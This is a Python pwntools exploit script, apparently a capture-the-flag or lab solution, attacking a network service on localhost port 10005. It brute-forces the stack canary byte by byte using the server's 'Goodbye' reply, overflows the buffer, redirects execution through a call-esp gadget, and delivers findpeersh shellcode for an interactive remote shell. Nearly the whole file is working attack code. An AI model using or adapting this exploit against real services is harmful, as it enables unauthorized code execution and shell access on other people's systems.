#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(arch = "i386", os = "linux")
#We will connect and reconnect a lot and we do not want to be told every time we do it.
getLogger('pwnlib.tubes').setLevel('WARNING')

SHELLCODE = asm(shellcraft.findpeersh())
CANARY_OFFSET = 320
CALL_ESP = 0x08048b8c #ECX and ESP pointed into data that we controll, found with "ROPgadget --binary $C | grep -E ': ((jmp)|(call)) ((ecx)|(esp))'"
RET_OFFSET = 12

def connect():
    r = remote('localhost', 10005)
    r.recvline()
    return r

def brute_canary():
    '''This function will find the canary by brute force.
       It will overwrite the canary one byte at a time.
       If the server responds with 'Goodbye...' we have found a good byte.
       If not, we try another.
       When we have four bytes, the canary is complete.
    '''
    canary = '' #This will contain the good canary bytes
    pcanary = log.progress('Canary') #We want status updates
    #Run as long as we do not have all four canary bytes
    while len(canary) < 4:
        #Brute force one byte (values 0-255).
        for c in [chr(i) for i in range(256)]:
            #Next four lines are simply updating the status
            temp_full_canary = canary + c
            while len(temp_full_canary) < 4:
                temp_full_canary += '\0'
            pcanary.status('0x%08x' % u32(temp_full_canary))

            #Send known good canary byte and one byte that we want to test
            r = connect()
            r.send(flat(0xffffffff, 'A' * CANARY_OFFSET, canary, c))
            #If server responds with 'Goodbye...' we have found a good canary byte
            if 'Goodbye' in r.recvall():
                canary += c
                break
    #End by updating the status with a success message
    pcanary.success('0x%x', u32(canary))
    return canary

r = connect()
r.send(flat(0xffffffff, 
            'A' * CANARY_OFFSET,
            brute_canary(),
            'A' * RET_OFFSET,
            CALL_ESP,
            SHELLCODE))
r.interactive()
